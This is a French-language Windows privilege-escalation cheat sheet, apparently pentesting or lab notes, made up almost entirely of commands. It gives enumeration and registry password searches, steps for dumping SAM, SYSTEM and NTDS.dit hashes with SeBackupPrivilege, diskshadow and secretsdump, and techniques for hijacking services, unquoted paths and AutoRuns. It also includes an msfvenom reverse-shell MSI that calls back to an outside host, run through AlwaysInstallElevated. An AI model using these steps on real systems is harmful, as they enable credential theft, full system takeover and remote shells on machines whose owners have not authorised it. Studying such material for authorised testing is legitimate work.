# Enumération

winPEAS : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

```
whoami /groups
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
systeminfo
ipconfig /all
route print
netstat -ano
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-History
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-ScheduledTask
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
netstat -ant | findstr /i ESTABLISHED
set
dir env:
Get-ChildItem Env: | ft Key,Value
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword
Get-PSReadlineOption
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

Fichier intéressants :
```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

Se connecter à un autre users :
```
runas /user:athenax cmd
```

Ouvrir powershell en mode admin
```
powershell -Command "Start-Process powershell -Verb RunAs"
```

Script runas avec password
```
$Username = "NomUtilisateur" 
$Password = ConvertTo-SecureString "VotreMotDePasse" -AsPlainText -Force 
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password) 
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command Your-Command-Here" -Credential $Credential -NoNewWindow
```

Voir les droits
```
icacls "C:\xampp\apache\bin\httpd.exe"
```

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

# Privilège

## SeBackupPrivilege / SeRestorePrivilege

```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

cd Temp
download sam
download system

impacket-secretsdump -system system -sam sam LOCAL
```

```
# Lire un fichier
robocopy "C:\Users\Administrator\Desktop" "C:\temp" fichier.txt /B
Copy-Item -Path "C:\Users\Administrator\Desktop\fichier.txt" -Destination "C:\temp\fichier.txt" -Force -Backup
```

### Ntds

1. Créer cmd à c:\windows\temp
```
set context persistent nowriters
add volume c: alias temp
create
expose %temp% h:
exit
```

Attention, si créer sous linux il faut effectuer la commande : `unix2dos cmd`

2. Créer un shadow volume
```
diskshadow /s cmd
```

Eventuellement :
```
Get-PSDrive
type h:\Users\Administrator\Desktop\root.txt
```

3. Upload SeBackupPrivilegeUtils.dll et SeBackupPrivilegeCmdLets.dll
https://github.com/giuliano108/SeBackupPrivilege

4. Copier les fichiers dans la shadow copie H:
```
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll
```

5. Importer .dll et exécuter
```
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -Overwrite
Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM c:\windows\temp\SYSTEM -Overwrite
```

6. Obtenir tous les creds
```
impacket-secretsdump -ntds NTDS -system SYSTEM LOCAL
```

# Service exploit

```
sc query | find "RUNNING"
Get-Service | Where-Object {$_.Status -eq 'Running'}
tasklist /svc
```

## Insecure service permission

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

```
sc qc daclsvc # Regarder avec quel privilege il s'execute
sc config daclsvc binpath= "\"C:\users\desktop\rev.exe\""
net start daclsvc
```

## Unquoted Service Path

```
sc qc unquotedsvc
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" # Vérifier si on peut écrire dans le dossier
+ ajouter le binaire dans ce dossier
net start unquotedsvc
```

## Insecure Service Executables

```
sc qc filepermsvc
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe" # On peut remplacer le binaire par un malicieux
net start filepermsvc
```

# Registry

## AutoRuns

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# voir qui a les droits sur le programme listé
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
# modifier le binaire par un malicieux
rdesktop 10.10.168.254
```

## AlwaysInstallelevated


"0x1"
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi

msiexec /quiet /qn /i C:\users\user\desktop\reverse.msi
```


# Password

```
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

